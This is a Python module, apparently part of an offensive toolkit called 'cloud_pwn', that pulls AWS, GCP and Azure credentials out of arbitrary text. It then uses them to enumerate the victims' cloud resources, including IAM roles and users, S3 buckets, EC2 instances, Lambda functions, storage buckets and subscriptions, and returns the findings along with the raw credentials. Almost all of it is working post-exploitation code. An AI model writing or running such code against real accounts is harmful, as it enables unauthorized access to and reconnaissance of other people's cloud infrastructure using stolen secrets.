import os
import re
import subprocess
from typing import Dict, Optional

import requests

from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("cloud_pwn")

AWS_ROLE_ARN_RE = re.compile(r"arn:aws:iam::\d+:role/\S+")
AWS_ACCESS_KEY_RE = re.compile(r"(?i)(AccessKeyId|SecretAccessKey|SessionToken)\s*[:=]\s*['\"]?(\S+?)['\"]?[\s,\n\r\]]")
GCP_TOKEN_RE = re.compile(r"(?i)(access_token)\s*[:=]\s*['\"]?(\S+?)['\"]?")
AZURE_TOKEN_RE = re.compile(r"(?i)(access_token)\s*[:=]\s*['\"]?(\S+?)['\"]?")
SUBNET_RE = re.compile(r"subnet-[\da-f]+")
VPC_RE = re.compile(r"vpc-[\da-f]+")
S3_BUCKET_RE = re.compile(r"(\S+\.s3\.amazonaws\.com|\S+\.s3-website-\S+)")
AMI_RE = re.compile(r"ami-[\da-f]+")
INSTANCE_ID_RE = re.compile(r"i-[\da-f]{8,}")


def parse_aws_credentials(text: str) -> Dict:
    creds = {}
    role_match = AWS_ROLE_ARN_RE.search(text)
    if role_match:
        creds["role_arn"] = role_match.group(0)
    access_key = re.search(r"(?i)AccessKeyId\s*['\"]?(\S+)['\"]?", text)
    if access_key:
        creds["access_key_id"] = access_key.group(1).strip().rstrip(",")
    secret_key = re.search(r"(?i)SecretAccessKey\s*['\"]?(\S+)['\"]?", text)
    if secret_key:
        creds["secret_access_key"] = secret_key.group(1).strip().rstrip(",")
    session_token = re.search(r"(?i)SessionToken\s*['\"]?(\S+)['\"]?", text)
    if session_token:
        creds["session_token"] = session_token.group(1).strip().rstrip(",")
    region = re.search(r"(?i)Region\s*['\"]?(\S+)['\"]?", text)
    if region:
        creds["region"] = region.group(1).strip().rstrip(",")
    return creds


def parse_gcp_credentials(text: str) -> Dict:
    creds = {}
    token = re.search(r"(?i)access_token\s*['\"]?(\S+?)['\"]?", text)
    if token:
        creds["access_token"] = token.group(1).rstrip(",")
    project = re.search(r"(?i)project[_\s]?id\s*['\"]?(\S+?)['\"]?", text)
    if project:
        creds["project_id"] = project.group(1).rstrip(",")
    return creds


def parse_azure_credentials(text: str) -> Dict:
    creds = {}
    token = re.search(r"(?i)access_token\s*['\"]?(\S+?)['\"]?", text)
    if token:
        creds["access_token"] = token.group(1).rstrip(",")
    tenant = re.search(r"(?i)tenant[_\s]?id\s*['\"]?(\S+?)['\"]?", text)
    if tenant:
        creds["tenant_id"] = tenant.group(1).rstrip(",")
    return creds


class CloudPwn:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = settings.verify_ssl
        self.session.headers.update({"User-Agent": "aimy-cloud-pwn/1.0"})

    def exploit_aws(self, creds: Dict) -> Dict:
        result = {"provider": "aws", "success": False, "actions": []}
        if not creds.get("access_key_id") or not creds.get("secret_access_key"):
            result["error"] = "Missing AWS access key or secret key"
            return result
        env = os.environ.copy()
        env["AWS_ACCESS_KEY_ID"] = creds["access_key_id"]
        env["AWS_SECRET_ACCESS_KEY"] = creds["secret_access_key"]
        env["AWS_DEFAULT_REGION"] = creds.get("region", "us-east-1")
        if creds.get("session_token"):
            env["AWS_SESSION_TOKEN"] = creds["session_token"]
        checks = [
            ("sts_get_caller_identity", "aws sts get-caller-identity"),
            ("iam_list_roles", "aws iam list-roles --max-items 20 2>/dev/null || true"),
            ("iam_list_users", "aws iam list-users --max-items 20 2>/dev/null || true"),
            ("s3_list_buckets", "aws s3 ls 2>/dev/null || true"),
            ("ec2_describe_instances", "aws ec2 describe-instances --max-items 10 2>/dev/null || true"),
            ("lambda_list_functions", "aws lambda list-functions --max-items 20 2>/dev/null || true"),
        ]
        for name, cmd in checks:
            try:
                cmd_parts = cmd.split()
                r = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=30, env=env)
                output = (r.stdout or "")[:500]
                if r.returncode == 0 and output.strip():
                    result["actions"].append({"check": name, "output": output.strip()})
                    result["success"] = True
            except subprocess.TimeoutExpired:
                logger.debug("aws check %s timed out", name)
            except Exception as e:
                logger.debug("aws check %s: %s", name, e)
        return result

    def exploit_gcp(self, creds: Dict) -> Dict:
        result = {"provider": "gcp", "success": False, "actions": []}
        token = creds.get("access_token")
        project = creds.get("project_id", "")
        if not token:
            result["error"] = "Missing GCP access token"
            return result
        headers = {"Authorization": "Bearer %s" % token}
        api_calls = [
            ("compute_instances", "https://www.googleapis.com/compute/v1/projects/%s/zones/us-central1-a/instances" % project),
            ("storage_buckets", "https://www.googleapis.com/storage/v1/b?project=%s" % project),
            ("iam_roles", "https://iam.googleapis.com/v1/projects/%s/roles" % project),
        ]
        for name, api_url in api_calls:
            try:
                r = self.session.get(api_url, headers=headers, timeout=15)
                if r.status_code == 200:
                    data = r.json()
                    items = data.get("items", data.get("kind", ""))
                    result["actions"].append({"check": name, "response_preview": str(items)[:200]})
                    result["success"] = True
            except Exception as e:
                logger.debug("gcp api %s: %s", name, e)
        return result

    def exploit_azure(self, creds: Dict) -> Dict:
        result = {"provider": "azure", "success": False, "actions": []}
        token = creds.get("access_token")
        if not token:
            result["error"] = "Missing Azure access token"
            return result
        headers = {"Authorization": "Bearer %s" % token}
        api_calls = [
            ("list_subscriptions", "https://management.azure.com/subscriptions?api-version=2020-01-01"),
            ("list_vms", "https://management.azure.com/subscriptions/{sub_id}/providers/Microsoft.Compute/virtualMachines?api-version=2022-03-01"),
        ]
        for name, api_url in api_calls:
            try:
                r = self.session.get(api_url, headers=headers, timeout=15)
                if r.status_code == 200:
                    data = r.json()
                    result["actions"].append({"check": name, "response": str(data)[:300]})
                    result["success"] = True
            except Exception as e:
                logger.debug("azure api %s: %s", name, e)
        return result

    def run(self, text: str, cloud_hint: Optional[str] = None) -> Dict:
        aws_creds = parse_aws_credentials(text)
        gcp_creds = parse_gcp_credentials(text)
        azure_creds = parse_azure_credentials(text)
        if aws_creds.get("access_key_id"):
            result = self.exploit_aws(aws_creds)
            result["raw_creds"] = {k: (v[:20] + "...") if len(v) > 20 else v for k, v in aws_creds.items() if v}
            return result
        if gcp_creds.get("access_token"):
            result = self.exploit_gcp(gcp_creds)
            result["raw_creds"] = gcp_creds
            return result
        if azure_creds.get("access_token"):
            result = self.exploit_azure(azure_creds)
            result["raw_creds"] = azure_creds
            return result
        return {"provider": cloud_hint or "unknown", "success": False, "error": "No usable cloud credentials found"}


def check(credentials_text: str, cloud_hint: Optional[str] = None) -> Dict:
    pwn = CloudPwn()
    return pwn.run(credentials_text, cloud_hint)
